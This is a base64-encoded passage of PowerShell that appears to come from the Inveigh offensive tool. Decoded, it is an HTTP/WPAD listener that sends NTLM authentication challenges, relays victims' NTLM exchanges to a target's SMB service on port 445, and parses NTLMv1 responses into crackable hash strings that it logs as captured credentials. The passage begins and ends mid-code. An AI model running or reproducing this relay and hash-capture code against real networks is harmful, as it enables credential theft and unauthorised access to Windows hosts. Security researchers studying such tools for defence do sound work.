ICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbl9leHRyYWN0ID0gJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb25fZXh0cmFjdC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb25fZXh0cmFjdCwwLCRIVFRQX2hlYWRlcl9hdXRob3JpemF0aW9uX2V4dHJhY3QuTGVuZ3RoKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigoJEhUVFBfcmVxdWVzdF9yYXdfVVJMIC1ub3RtYXRjaCAnL3dwYWQuZGF0JyAtYW5kICRIVFRQQXV0aCAtZXEgJ0Fub255bW91cycpIC1vciAoJEhUVFBfcmVxdWVzdF9yYXdfVVJMIC1tYXRjaCAnL3dwYWQuZGF0JyAtYW5kICRXUEFEQXV0aCAtZXEgJ0Fub255bW91cycpIC1vciAoCiAgICAgICAgICAgICRIVFRQX3JlcXVlc3RfcmF3X1VSTCAtbWF0Y2ggJy93cGFkLmRhdCcgLWFuZCAkV1BBREF1dGggLWxpa2UgJ05UTE0qJyAtYW5kICRXUEFEQXV0aElnbm9yZS5Db3VudCAtZ3QgMCAtYW5kICgkV1BBREF1dGhJZ25vcmUgfCBXaGVyZS1PYmplY3QgeyRIVFRQX2hlYWRlcl91c2VyX2FnZW50IC1tYXRjaCAkX30pKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfcmVzcG9uc2Vfc3RhdHVzX2NvZGUgPSAweDMyLDB4MzAsMHgzMAogICAgICAgICAgICAgICAgJEhUVFBfcmVzcG9uc2VfcGhyYXNlID0gMHg0ZiwweDRiCiAgICAgICAgICAgICAgICAkSFRUUF9jbGllbnRfY2xvc2UgPSAkdHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZigkcHJveHlfbGlzdGVuZXIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEhUVFBfcmVzcG9uc2Vfc3RhdHVzX2NvZGUgPSAweDM0LDB4MzAsMHgzNwogICAgICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGUgPSAweDUwLDB4NzIsMHg2ZiwweDc4LDB4NzksMHgyZCwweDQxLDB4NzUsMHg3NCwweDY4LDB4NjUsMHg2ZSwweDc0LDB4NjksMHg2MywweDYxLDB4NzQsMHg2NSwweDNhLDB4MjAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXNwb25zZV9zdGF0dXNfY29kZSA9IDB4MzQsMHgzMCwweDMxCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX2F1dGhlbnRpY2F0ZSA9IDB4NTcsMHg1NywweDU3LDB4MmQsMHg0MSwweDc1LDB4NzQsMHg2OCwweDY1LDB4NmUsMHg3NCwweDY5LDB4NjMsMHg2MSwweDc0LDB4NjUsMHgzYSwweDIwCgogICAgICAgICAgICAgICAgICAgIGlmKCRIVFRQX3JlcXVlc3RfcmF3X1VSTCAtbWF0Y2ggJy93cGFkLmRhdCcpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXNldF9kZWxheSA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX3Jlc2V0X2RlbGF5X3RpbWVvdXQgPSBOZXctVGltZVNwYW4gLVNlY29uZHMgJEhUVFBSZXNldERlbGF5VGltZW91dAogICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXNldF9kZWxheV9zdG9wd2F0Y2ggPSBbU3lzdGVtLkRpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRIVFRQX3Jlc3BvbnNlX3BocmFzZSA9IDB4NTUsMHg2ZSwweDYxLDB4NzUsMHg3NCwweDY4LDB4NmYsMHg3MiwweDY5LDB4N2EsMHg2NSwweDY0CiAgICAgICAgICAgICAgICAkSFRUUF9jbGllbnRfY2xvc2UgPSAkZmFsc2UKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgICAgICBpZigkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbi5TdGFydHNXaXRoKCdOVExNICcpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbiA9ICRIVFRQX2hlYWRlcl9hdXRob3JpemF0aW9uIC1yZXBsYWNlICdOVExNICcsJycKICAgICAgICAgICAgICAgIFtCeXRlW11dJEhUVFBfcmVxdWVzdF9ieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb24pCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkSFRUUF9yZXF1ZXN0X2J5dGVzWzguLjExXSkgLWVxICcwMS0wMC0wMC0wMCcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5TTUJfcmVsYXkgLWFuZCAkSFRUUF9zb3VyY2VfSVAgLW5lICRUYXJnZXQgLWFuZCAkcmVsYXlfc3RlcCAtZXEgMCkKICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IHRyaWdnZXJlZCBieSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEdyYWJiaW5nIGNoYWxsZW5nZSBmb3IgcmVsYXkgZnJvbSAiICsgJFRhcmdldCkKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHRvIFNNQiByZWxheSB0cmlnZ2VyZWQgYnkgJEhUVFBfc291cmNlX0lQIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gR3JhYmJpbmcgY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICIgKyAkVGFyZ2V0KQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgdHJpZ2dlcmVkIGJ5ICRIVFRQX3NvdXJjZV9JUCBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJHcmFiYmluZyBjaGFsbGVuZ2UgZm9yIHJlbGF5IGZyb20gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsaWVudC5SZWNlaXZlVGltZW91dCA9IDYwMDAwCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNvbm5lY3QoJFRhcmdldCwiNDQ1IikKICAgICAgICAgICAgICAgICAgICAgICAgJEhUVFBfY2xpZW50X2Nsb3NlID0gJGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICRyZWxheV9zdGVwID0gMQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZighJFNNQl9yZWxheV9zb2NrZXQuY29ubmVjdGVkKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiU01CIHJlbGF5IHRhcmdldCBpcyBub3QgcmVzcG9uZGluZyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVsYXlfc3RlcCA9IDAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHRhcmdldCBpcyBub3QgcmVzcG9uZGluZyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSB0YXJnZXQgaXMgbm90IHJlc3BvbmRpbmciKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHJlbGF5X3N0ZXAgLWVxIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfYnl0ZXMgPSBTTUJSZWxheUNoYWxsZW5nZSAkU01CX3JlbGF5X3NvY2tldCAkSFRUUF9yZXF1ZXN0X2J5dGVzICRTTUJfdmVyc2lvbgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfcmVsYXlfYnl0ZXMuTGVuZ3RoIC1sZSAzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZWxheV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROVExNID0gTlRMTUNoYWxsZW5nZUJhc2U2NCAkQ2hhbGxlbmdlICRIVFRQX3NvdXJjZV9JUCAkSFRUUF9jbGllbnQuQ2xpZW50LlJlbW90ZUVuZHBvaW50LlBvcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRyZWxheV9zdGVwIC1lcSAxKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3VzZXJfSUQgPSAkU01CX3JlbGF5X2J5dGVzWzM0Li4zM10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9yZWxheV9ieXRlcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUCA9ICRTTUJfcmVsYXlfTlRMTVNTUCAtcmVwbGFjZSAiLSIsIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUF9pbmRleCA9ICRTTUJfcmVsYXlfTlRMTVNTUC5JbmRleE9mKCI0RTU0NEM0RDUzNTM1MDAwIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCA9ICRTTUJfcmVsYXlfTlRMTVNTUF9pbmRleCAvIDIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZG9tYWluX2xlbmd0aCA9IERhdGFMZW5ndGgyICgkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggKyAxMikgJFNNQl9yZWxheV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kb21haW5fbGVuZ3RoX29mZnNldF9ieXRlcyA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDEyKS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDE5KV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdGFyZ2V0X2xlbmd0aCA9IERhdGFMZW5ndGgyICgkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggKyA0MCkgJFNNQl9yZWxheV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl90YXJnZXRfbGVuZ3RoX29mZnNldF9ieXRlcyA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDQwKS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU1ICsgJFNNQl9kb21haW5fbGVuZ3RoKV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfdGFyZ2V0X2ZsYWcgPSAkU01CX3JlbGF5X2J5dGVzWygkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggKyAyMildCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1fY2hhbGxlbmdlID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMjQpLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMzEpXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV90YXJnZXRfZGV0YWlscyA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU2ICsgJFNNQl9kb21haW5fbGVuZ3RoKS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU1ICsgJFNNQl9kb21haW5fbGVuZ3RoICsgJFNNQl90YXJnZXRfbGVuZ3RoKV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2Vzc2lvbl9JRCA9ICRTTUJfcmVsYXlfYnl0ZXNbNDQuLjUxXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfcmVsYXlfYnl0ZXNbNC4uN10pIC1lcSAnZmYtNTMtNGQtNDInKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdmVyc2lvbiAtZXEgJ1NNQjEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2J5dGVzID0gMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZG9tYWluX2xlbmd0aF9vZmZzZXRfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDUsMHg4MiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV90YXJnZXRfZmxhZyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhMiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNX2NoYWxsZW5nZSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3RhcmdldF9sZW5ndGhfb2Zmc2V0X2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3RhcmdldF9kZXRhaWxzCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0ID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEhUVFBfTlRMTV9ieXRlcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROVExNID0gJ05UTE0gJyArICROVExNX2NoYWxsZW5nZV9iYXNlNjQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9IFNNQk5UTE1DaGFsbGVuZ2UgJFNNQl9yZWxheV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUuQWRkKCRIVFRQX3NvdXJjZV9JUCArICRIVFRQX2NsaWVudC5DbGllbnQuUmVtb3RlRW5kcG9pbnQuUG9ydCArICcsJyArICROVExNX2NoYWxsZW5nZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJSZWNlaXZlZCBjaGFsbGVuZ2UgJE5UTE1fY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlByb3ZpZGluZyBjaGFsbGVuZ2UgJE5UTE1fY2hhbGxlbmdlIGZvciByZWxheSB0byAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlbGF5X3N0ZXAgPSAyCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFJlY2VpdmVkIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IGZyb20gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFByb3ZpZGluZyBjaGFsbGVuZ2UgJE5UTE1fY2hhbGxlbmdlIGZvciByZWxheSB0byAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBSZWNlaXZlZCBjaGFsbGVuZ2UgJE5UTE1fY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gUHJvdmlkaW5nIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IHRvICRIVFRQX3NvdXJjZV9JUCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE0gPSBOVExNQ2hhbGxlbmdlQmFzZTY0ICRDaGFsbGVuZ2UgJEhUVFBfc291cmNlX0lQICRIVFRQX2NsaWVudC5DbGllbnQuUmVtb3RlRW5kcG9pbnQuUG9ydAogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE0gPSBOVExNQ2hhbGxlbmdlQmFzZTY0ICRDaGFsbGVuZ2UgJEhUVFBfc291cmNlX0lQICRIVFRQX2NsaWVudC5DbGllbnQuUmVtb3RlRW5kcG9pbnQuUG9ydAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkSFRUUF9yZXF1ZXN0X2J5dGVzWzguLjExXSkgLWVxICcwMy0wMC0wMC0wMCcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9sZW5ndGggPSBEYXRhTGVuZ3RoMiAyMCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9vZmZzZXQgPSBEYXRhTGVuZ3RoNCAyNCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoID0gRGF0YUxlbmd0aDIgMjggJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX29mZnNldCA9IERhdGFMZW5ndGg0IDMyICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICAgICBbU3RyaW5nXSROVExNX2NoYWxsZW5nZSA9ICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlIC1saWtlICRIVFRQX3NvdXJjZV9JUCArICRIVFRQX2NsaWVudC5DbGllbnQuUmVtb3RlRW5kcG9pbnQuUG9ydCArICcqJwogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlLlJlbW92ZSgkTlRMTV9jaGFsbGVuZ2UpCiAgICAgICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gJE5UTE1fY2hhbGxlbmdlLlN1YnN0cmluZygoJE5UTE1fY2hhbGxlbmdlLkluZGV4T2YoIiwiKSkgKyAxKQogICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCRIVFRQX05UTE1fZG9tYWluX2xlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX3N0cmluZyA9ICcnCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7ICAKICAgICAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nID0gRGF0YVRvU3RyaW5nICRIVFRQX05UTE1fZG9tYWluX29mZnNldCAkSFRUUF9OVExNX2RvbWFpbl9sZW5ndGggJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV91c2VyX2xlbmd0aCA9IERhdGFMZW5ndGgyIDM2ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX3VzZXJfb2Zmc2V0ID0gRGF0YUxlbmd0aDQgNDAgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCRIVFRQX05UTE1fdXNlcl9sZW5ndGggLWd0IDApCiAgICAgICAgICAgICAgICAgICAgeyAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV91c2VyX3N0cmluZyA9IERhdGFUb1N0cmluZyAkSFRUUF9OVExNX3VzZXJfb2Zmc2V0ICRIVFRQX05UTE1fdXNlcl9sZW5ndGggJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX3VzZXJfc3RyaW5nID0gIiIKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1faG9zdF9sZW5ndGggPSBEYXRhTGVuZ3RoMiA0NCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9ob3N0X29mZnNldCA9IERhdGFMZW5ndGg0IDQ4ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2hvc3Rfc3RyaW5nID0gRGF0YVRvU3RyaW5nICRIVFRQX05UTE1faG9zdF9vZmZzZXQgJEhUVFBfTlRMTV9ob3N0X2xlbmd0aCAkSFRUUF9yZXF1ZXN0X2J5dGVzCgogICAgICAgICAgICAgICAgICAgIGlmKCRIVFRQX05UTE1fbGVuZ3RoIC1lcSAyNCkgIyBOVExNdjEKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICROVExNX3R5cGUgPSAiTlRMTXYxIgogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJEhUVFBfcmVxdWVzdF9ieXRlc1soJEhUVFBfTlRMTV9vZmZzZXQgLSAyNCkuLigkSFRUUF9OVExNX29mZnNldCArICRIVFRQX05UTE1fbGVuZ3RoKV0pIC1yZXBsYWNlICItIiwiIgogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCg0OCwnOicpCiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1faGFzaCA9ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgKyAiOjoiICsgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nICsgIjoiICsgJE5UTE1fcmVzcG9uc2UgKyAiOiIgKyAkTlRMTV9jaGFsbGVuZ2UKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCROVExNX2NoYWxsZW5nZSAtYW5kICROVExNX3Jlc3BvbnNlIC1hbmQgKCRpbnZlaWdoLm1hY2hpbmVfYWNjb3VudHMgLW9yICghJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtYW5kIC1ub3QgJEhUVFBfTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHsgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2xpc3QuQWRkKCRIVFRQX05UTE1faGFzaCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSAkTlRMTV90eXBlIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAoJEhUVFBfTlRMTV9ob3N0X3N0cmluZykiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgf